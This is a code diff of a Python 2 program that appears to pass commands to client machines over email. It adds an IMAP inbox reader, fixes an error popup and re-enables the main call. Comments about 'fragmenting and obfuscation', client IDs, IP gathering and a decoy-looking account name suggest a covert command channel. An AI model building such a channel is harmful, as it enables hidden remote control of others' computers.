@@ -26,8 +26,8 @@ test_account_name = "transaction.failed.0@gmail.com"
 currentDir = os.getcwd()
 
 
-def populateAccounts(): #returns a dictionary of lists of accounts
-  #example format returned: {0: ['account1@mail.com', 'password1'], 1: ['account2@mail.com', 'password2'], 2: ['account3@mail.com', 'password3']}
+def populateAccounts(): # returns a dictionary of lists of accounts
+  # example format returned: {0: ['account1@mail.com', 'password1'], 1: ['account2@mail.com', 'password2'], 2: ['account3@mail.com', 'password3']}
   dirtyaccountList = open(currentDir + "/config/accountList", 'r+b').readlines()
   accounts= {}
   counter = 0
@@ -235,7 +235,7 @@ def openFileBox():
   else:
     return 0
 def popUpError(ErrorMessage):
-  sg.PopupError('PopupError')
+  sg.PopupError(ErrorMessage)
   pass
 def mailSender(reUser, seUser,sePass,subject,text,filenames): #the actual sending of the email is handled here, fragmenting and obfuscation done elsewhere
   email_text = """\
@@ -253,6 +253,36 @@ Subject: %s
   server.login(seUser, sePass)
   server.sendmail(seUser, reUser, email_text)
 def reMailChecker(accountName, accountPass, serverName): #returns all recent emails received by the account from the main server
+  server = imaplib.IMAP4_SSL(IMAP_SERVER, IMAP_PORT)
+  
+  server.login(accountName, accountPass)
+  server.select("inbox")
+  
+  type, data = server.search(None, 'ALL')
+  mail_ids = data[0]
+  
+  id_list = mail_ids.split()
+  
+  first_id = int(id_list[0])
+  
+  latest_id = int(id_list[-1])
+  print latest_id
+  
+  for i in range(latest_id, first_id, -1):
+    typ, data = server.fetch(i, '(RFC822)')
+    # print data
+    for response_part in data:
+      if isinstance(response_part, tuple):
+        msg = email.message_from_string(response_part[1])
+        # print msg
+        email_subject = msg['subject']
+        email_from = msg['from']
+        print email_subject
+        print email_from
+        
+        if msg.is_multipart():
+          for part in msg.walk():
+            print part.get_content_type()
   pass
 
 def encrypt(inString,sequenceNum):
@@ -338,6 +368,6 @@ def formatCommand(clientID, command, updateNum): #all variables passed to the fu
 #print formatCommand("12", "asdADSEAAAAAAaaaaaaAAAAAAAAAA((*()(*(*&o#", "1233")
 #print getIPs()
 #print processEmail('transaction.failed.0@gmail.com')
-#main(startup())
+main(startup())
 #addAccount()
 #openFileBox()
